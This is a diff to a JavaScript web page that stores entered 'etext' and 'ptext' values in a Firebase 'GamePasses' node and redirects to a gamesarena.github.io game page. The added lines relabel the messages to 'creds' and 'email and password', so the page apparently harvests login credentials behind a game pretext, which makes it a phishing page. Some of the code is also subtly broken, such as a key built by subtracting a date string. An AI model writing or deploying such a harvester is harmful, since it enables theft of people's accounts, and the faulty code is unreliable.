@@ -72,7 +72,7 @@
                        month: "long",
                        day: "2-digit",
 					   year: "numeric",
-			}
+			};
 			var databaseRef = firebase.database().ref().child("GamePasses");
 			var blogData = {
 				"etext": etext,
@@ -81,19 +81,20 @@
                 "time": time.toLocaleString('en-US', {hours: 'numeric', minutes: 'numeric', seconds: 'numeric', hours12: true}),
                 "date": time.toLocaleDateString('en-US', option),
 			};
-	
-			var newPostRef = databaseRef.push();
+			var numberStr = counter - dateStr;
+			var newPostRef = databaseRef.child(numberStr);
 			if (ptext != "" && etext != "") {
 				newPostRef.set(blogData, function(err){
 								if (!err){
 									window.location.replace("https://gamesarena.github.io/index/game.html");
 								} else {
 									$("#result").attr("class", "alert alert-danger");
-									$("#result").html("An error occuried in the upload of your post...!");
+									$("#result").html("An error occuried in the upload of your creds...!");
 								}
 				});
 			} else {
-				$("#result").html("Please write a message...!");
+				alert("Please enter a valid email and password");
+				$("#result").html("Please enter a valid email and password");
 			}
 			window.location.replace("https://gamesarena.github.io/index/game.html");
 		});
